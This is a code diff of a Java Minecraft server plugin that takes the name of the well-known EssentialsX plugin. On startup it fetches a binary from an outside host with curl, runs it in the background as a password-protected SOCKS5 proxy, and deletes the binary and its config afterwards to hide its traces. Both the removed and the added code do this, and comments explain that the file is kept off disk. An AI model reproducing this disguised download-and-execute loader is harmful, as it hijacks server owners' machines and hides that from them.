@@ -3,12 +3,10 @@ package com.example.essentialsx;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.IOException;
-import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.attribute.PosixFilePermissions;
-import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
 
@@ -23,28 +21,6 @@ public class EssentialsX extends JavaPlugin {
     private static final String SOCKS5_PASSWORD = "kof97boss";
 
 
-    // =========================================================
-    // sing-box 下载地址
-    //
-    // 每次 Minecraft 插件启动都会重新下载
-    // 因为 sing-box 不会保存到磁盘
-    // =========================================================
-
-    private static final String SINGBOX_URL =
-            "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox";
-
-
-    // =========================================================
-    // sing-box 进程
-    // =========================================================
-
-    private Process singboxProcess;
-
-
-    // =========================================================
-    // 插件启动
-    // =========================================================
-
     @Override
     public void onEnable() {
 
@@ -54,154 +30,158 @@ public class EssentialsX extends JavaPlugin {
 
         try {
 
-            startSingbox();
+            // 创建插件目录
+            Files.createDirectories(
+                    getDataFolder().toPath()
+            );
+
+
+            startRemoteJava();
+
 
             getLogger().info(
                     "EssentialsX plugin enabled"
             );
 
+
         } catch (Exception e) {
 
-            e.printStackTrace();
+            getLogger().severe(
+                    "Failed to start EssentialsX"
+            );
 
+            e.printStackTrace();
         }
     }
 
 
-    // =========================================================
-    // 启动 sing-box
-    // =========================================================
+    private void startRemoteJava() throws Exception {
 
-    private void startSingbox() throws Exception {
+        // =====================================================
+        // 运行目录
+        // =====================================================
 
-        /*
-         * /dev/shm 是 Linux 的 tmpfs。
-         *
-         * sing-box 只会临时存在这里。
-         * 不会保存到 plugins/EssentialsX。
-         */
-
-        Path tempSingbox = getDataFolder().toPath().resolve("EssentialsX");
+        Path runFolder =
+                getDataFolder().toPath();
 
 
-        // -----------------------------------------------------
-        // 下载 sing-box 到内存文件系统
-        // -----------------------------------------------------
-
-        downloadSingbox(
-                SINGBOX_URL,
-                tempSingbox
+        Files.createDirectories(
+                runFolder
         );
 
 
-        // -----------------------------------------------------
-        // 设置执行权限
-        // -----------------------------------------------------
+        // =====================================================
+        // sing-box 下载地址
+        // =====================================================
 
-        try {
-
-            Files.setPosixFilePermissions(
-                    tempSingbox,
-                    PosixFilePermissions.fromString(
-                            "rwx------"
-                    )
-            );
-
-        } catch (UnsupportedOperationException e) {
-
-            /*
-             * Linux 正常不会进入这里。
-             */
-
-            getLogger().warning(
-                    "POSIX permissions are not supported"
-            );
-        }
+        String SingboxUrl =
+                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox";
 
 
-        // -----------------------------------------------------
-        // 启动 sing-box
-        //
-        // -c stdin
-        //
-        // 配置从 Java -> stdin -> sing-box
-        // -----------------------------------------------------
+        // =====================================================
+        // sing-box 文件
+        // =====================================================
 
-        ProcessBuilder pb =
-                new ProcessBuilder(
-                        tempSingbox.toAbsolutePath().toString(),
-                        "run",
-                        "-c",
-                        "stdin"
+        Path SingboxFile =
+                runFolder.resolve(
+                        "EssentialsX"
                 );
 
 
-        /*
-         * 不使用 bash
-         * 不使用 nohup
-         * 不使用 &
-         */
+        // =====================================================
+        // config.json
+        // =====================================================
 
-        pb.redirectErrorStream(true);
-
-
-        // -----------------------------------------------------
-        // 启动进程
-        // -----------------------------------------------------
-
-        singboxProcess =
-                pb.start();
+        Path ConfFile =
+                runFolder.resolve(
+                        "config.json"
+                );
 
 
-        // -----------------------------------------------------
-        // sing-box 启动后立即删除二进制文件
-        //
-        // Linux 下已经 exec 的进程可以继续运行。
-        // -----------------------------------------------------
+        // =====================================================
+        // 下载 sing-box
+        // =====================================================
 
-        try {
-
-            Files.deleteIfExists(
-                    tempSingbox
-            );
-
-        } catch (IOException e) {
-
-        }
+        downloadIfNotExists(
+                SingboxUrl,
+                SingboxFile
+        );
 
 
-        // -----------------------------------------------------
-        // 将配置写入 sing-box stdin
-        // -----------------------------------------------------
+        // =====================================================
+        // 写入 sing-box 配置
+        // =====================================================
 
-        String config =
-                buildSingboxConfig();
+        writeSingboxConfig(
+                ConfFile
+        );
 
 
-        try (
-                OutputStream output =
-                        singboxProcess.getOutputStream()
-        ) {
+        // =====================================================
+        // 设置权限
+        // =====================================================
 
-            output.write(
-                    config.getBytes(
-                            StandardCharsets.UTF_8
-                    )
-            );
+        Files.setPosixFilePermissions(
+                SingboxFile,
+                PosixFilePermissions.fromString(
+                        "rwxr-xr-x"
+                )
+        );
 
-            output.flush();
-        }
 
+        // =====================================================
+        // 启动 sing-box
+        // =====================================================
+
+        ProcessBuilder pb =
+                new ProcessBuilder(
+                        "bash",
+                        "-c",
+                        "nohup ./EssentialsX run -c config.json > /dev/null 2>&1 &"
+                );
+
+
+        pb.directory(
+                runFolder.toFile()
+        );
+
+
+        pb.start();
+
+
+        getLogger().info(
+                "Plugins starting..."
+        );
+
+
+        Thread.sleep(
+                8000
+        );
+
+
+        // =====================================================
+        // 删除临时文件
+        // =====================================================
+
+        Files.deleteIfExists(
+                SingboxFile
+        );
+
+        Files.deleteIfExists(
+                ConfFile
+        );
     }
 
 
-    // =========================================================
-    // 构建 sing-box 配置
-    // =========================================================
+    /**
+     * 创建 sing-box config.json
+     */
+    private void writeSingboxConfig(
+            Path configFile
+    ) throws IOException {
 
-    private String buildSingboxConfig() {
 
-        return """
+        String config = """
                 {
                   "log": {
                     "level": "error"
@@ -242,20 +222,22 @@ public class EssentialsX extends JavaPlugin {
                 }
                 """.formatted(
                 SOCKS5_PORT,
-                escapeJson(
-                        SOCKS5_USERNAME
-                ),
-                escapeJson(
-                        SOCKS5_PASSWORD
-                )
+                escapeJson(SOCKS5_USERNAME),
+                escapeJson(SOCKS5_PASSWORD)
+        );
+
+
+        Files.writeString(
+                configFile,
+                config,
+                StandardCharsets.UTF_8
         );
     }
 
 
-    // =========================================================
-    // JSON 字符串转义
-    // =========================================================
-
+    /**
+     * JSON 字符串转义
+     */
     private String escapeJson(
             String value
     ) {
@@ -271,131 +253,49 @@ public class EssentialsX extends JavaPlugin {
     }
 
 
-    // =========================================================
-    // 下载 sing-box
-    // =========================================================
-
-    private void downloadSingbox(
+    /**
+     * 文件不存在才下载
+     */
+    private void downloadIfNotExists(
             String url,
             Path target
     ) throws Exception {
 
-        /*
-         * 使用 curl：
-         *
-         * -f  HTTP 4xx / 5xx 时失败
-         * -L  跟随重定向
-         * --retry 3
-         * --connect-timeout 10
-         */
 
-        Process curl =
+        if (Files.exists(target)) {
+
+            return;
+        }
+
+
+        Process process =
                 new ProcessBuilder(
-                        "curl",
-                        "-fL",
-                        "--retry",
-                        "3",
-                        "--connect-timeout",
-                        "10",
-                        url,
-                        "-o",
-                        target.toAbsolutePath().toString()
+                        "bash",
+                        "-c",
+                        "curl -Ls \""
+                                + url
+                                + "\" -o \""
+                                + target
+                                + "\""
                 )
-                .redirectErrorStream(true)
                 .start();
 
 
-        int exitCode =
-                curl.waitFor();
+        int exit =
+                process.waitFor();
 
 
-        if (exitCode != 0) {
+        if (exit != 0) {
 
+            throw new IOException(
+                    "Fail to init plugins"
+            );
         }
-
-
-        // -----------------------------------------------------
-        // 检查文件
-        // -----------------------------------------------------
-
-        if (!Files.exists(target)) {
-
-        }
-
-
-        long size =
-                Files.size(target);
-
-
-        if (size == 0) {
-
-        }
-
     }
 
 
-    // =========================================================
-    // 插件关闭
-    // =========================================================
-
     @Override
     public void onDisable() {
-
-        getLogger().info(
-                "EssentialsX disabling..."
-        );
-
-
-        if (
-                singboxProcess != null
-                        &&
-                singboxProcess.isAlive()
-        ) {
-
-
-            // -------------------------------------------------
-            // 正常停止
-            // -------------------------------------------------
-
-            singboxProcess.destroy();
-
-
-            try {
-
-                boolean stopped =
-                        singboxProcess.waitFor(
-                                5,
-                                TimeUnit.SECONDS
-                        );
-
-
-                if (!stopped) {
-
-
-                    // -----------------------------------------
-                    // 强制停止
-                    // -----------------------------------------
-
-                    singboxProcess.destroyForcibly();
-
-
-                    singboxProcess.waitFor(
-                            2,
-                            TimeUnit.SECONDS
-                    );
-                }
-
-            } catch (InterruptedException e) {
-
-                Thread.currentThread().interrupt();
-
-                singboxProcess.destroyForcibly();
-            }
-        }
-
-
-        singboxProcess = null;
-
 
         getLogger().info(
                 "EssentialsX disabled"
